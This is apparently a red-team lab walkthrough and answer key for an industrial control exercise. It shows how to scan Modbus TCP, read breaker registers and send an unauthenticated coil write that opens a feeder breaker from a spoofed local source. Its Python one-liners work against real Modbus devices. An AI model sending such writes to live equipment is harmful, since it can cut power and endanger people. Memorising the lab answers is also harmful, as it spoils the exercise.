# Modbus TCP Feeder Breaker Unauthorized Write

> This walkthrough shows the manual red-team path. Do not use attack.yml for the red solution.

## 1. Discover the Modbus service

> Scan the target for the standard Modbus TCP port.

î°ƒTARGET=\<target-ip\>

nmap -sT -Pn -p 502 "\$TARGET"

> î°‚Expected finding:
>
> <img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/EtherNetIP-Protection-Relay-Identity-Sweep-SingleHost-Red/media/image3.png" style="width:6.5in;height:2.16667in" />

î°ƒ502/tcp open mbap

## î°‚2. Query the device using real Modbus reads

> Read the first few holding registers through a raw Modbus TCP request.

î°ƒTARGET=\<target-ip\>

python3 -c 'import socket,struct,os; t=os.environ.get("TARGET"); s=socket.create_connection((t,502),timeout=3); pdu=bytes(\[3\])+struct.pack("\>HH",0,5); pkt=struct.pack("\>HHHB",1,0,len(pdu)+1,1)+pdu; s.sendall(pkt); print(s.recv(1024).hex()); s.close()'

> î°‚The response should contain function code 03 and register data. Register 2 shows breaker state:
>
> <img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/EtherNetIP-Protection-Relay-Identity-Sweep-SingleHost-Red/media/image2.png" style="width:6.5in;height:7.02778in" />

î°ƒ1 = breaker closed

0 = breaker open

> î°‚Read the first few coils.

î°ƒTARGET=\<target-ip\>

python3 -c 'import socket,struct,os; t=os.environ.get("TARGET"); s=socket.create_connection((t,502),timeout=3); pdu=bytes(\[1\])+struct.pack("\>HH",0,4); pkt=struct.pack("\>HHHB",2,0,len(pdu)+1,1)+pdu; s.sendall(pkt); print(s.recv(1024).hex()); s.close()'

## î°‚<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/EtherNetIP-Protection-Relay-Identity-Sweep-SingleHost-Red/media/image1.png" style="width:6.5in;height:5.98611in" />

## 3. Identify the command coil

> In this lab, the unsafe design accepts write commands from any Modbus client. Test write-single-coil behavior in a small controlled range while monitoring breaker state.
>
> The command point that opens the feeder breaker is:

î°ƒUnit ID: 1

Function code: 5, Write Single Coil

Coil address: 0

Requested state: ON, 0xFF00

## î°‚4. Send the unauthorized write

> From a normal remote host, the source IP will be your host IP. In the local lab, you can bind to a non-approved loopback source to create a clear unauthorized source in the logs.

î°ƒTARGET=\<target-ip\>

SRC=127.0.0.77

python3 -c 'import os,socket,struct; target=os.environ.get("TARGET"); src=os.environ.get("SRC","127.0.0.77"); s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(3);

try:

s.bind((src,0))

except OSError:

pass

s.connect((target,502)); pdu=bytes(\[5\])+struct.pack("\>HH",0,0xFF00); pkt=struct.pack("\>HHHB",0x1337,0,len(pdu)+1,1)+pdu; s.sendall(pkt); print(s.recv(1024).hex()); s.close()'

## î°‚<img src="https://raw.githubusercontent.com/hacktify-uv/temp/main/EtherNetIP-Protection-Relay-Identity-Sweep-SingleHost-Red/media/image4.png" style="width:6.41667in;height:1.72917in" />

## 5. Confirm process impact

> Read the status registers again.

î°ƒTARGET=\<target-ip\>

python3 -c 'import socket,struct,os; t=os.environ.get("TARGET"); s=socket.create_connection((t,502),timeout=3); pdu=bytes(\[3\])+struct.pack("\>HH",0,5); pkt=struct.pack("\>HHHB",3,0,len(pdu)+1,1)+pdu; s.sendall(pkt); print(s.recv(1024).hex()); s.close()'

> î°‚Or, on the lab host:

î°ƒ/usr/local/bin/modbus_read_status.py 127.0.0.1 502

> î°‚Expected status after the unauthorized write:

î°ƒBREAKER:OPEN

UNAUTH_ALARM:ALARM

## î°‚Red Answer

> Submit:

î°ƒProtocol: Modbus TCP

Unit ID: 1

Function code: 5, Write Single Coil

Command coil: 0

Requested value: ON, 0xFF00

Process impact: feeder breaker opened

Unauthorized source used in lab: 127.0.0.77

Approved master allowlist entry: 127.0.0.10

î°‚

